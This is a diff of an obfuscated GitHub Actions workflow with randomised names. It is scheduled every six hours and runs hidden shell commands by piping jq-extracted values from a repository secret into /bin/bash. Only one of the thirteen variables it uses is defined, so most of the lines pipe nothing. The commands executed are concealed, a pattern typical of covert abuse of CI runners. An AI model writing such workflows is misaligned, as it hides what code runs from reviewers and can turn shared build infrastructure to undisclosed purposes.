@@ -1,26 +1,30 @@
 name: tianzhongze9348
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
+    - cron: '27 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianzhongze9348
         env:
-          wzew96: ${{ secrets.wzew96 }}
+          lamxh01055: ${{ secrets.lamxh01055 }}
         run: |
-          echo $wzew96 | jq -r .uwtf24948 | /bin/bash
-          echo $st59002 | jq -r .sucbr9125 | /bin/bash
-          echo $me26 | jq -r .ckqv29 | /bin/bash
-          echo $wn6789 | jq -r .lfgbw27585 | /bin/bash
-          echo $fvq06069 | jq -r .ytrm8 | /bin/bash
-          echo $sy03291 | jq -r .yfdew72818 | /bin/bash
-          echo $lavp8344 | jq -r .twcd3429 | /bin/bash
-          echo $do240 | jq -r .pix299 | /bin/bash
-          echo $wvg02210 | jq -r .vvlw00 | /bin/bash
-          echo $jea4 | jq -r .fwxb07811 | /bin/bash
+          echo $lamxh01055 | jq -r .jxpp86684 | /bin/bash
+          echo $swc6048 | jq -r .wgue49510 | /bin/bash
+          echo $rwhw050 | jq -r .la5 | /bin/bash
+          echo $ambs3 | jq -r .wnk864 | /bin/bash
+          echo $bln11 | jq -r .yv72 | /bin/bash
+          echo $zm30 | jq -r .bwup5 | /bin/bash
+          echo $tsroz1499 | jq -r .m2411 | /bin/bash
+          echo $ggrjf189 | jq -r .rj10 | /bin/bash
+          echo $xgs1 | jq -r .nvuy28 | /bin/bash
+          echo $jsz4930 | jq -r .ft5188 | /bin/bash
+          echo $bq527 | jq -r .ykcoz879 | /bin/bash
+          echo $mtz0 | jq -r .g43 | /bin/bash
+          echo $or32 | jq -r .d1536 | /bin/bash
 
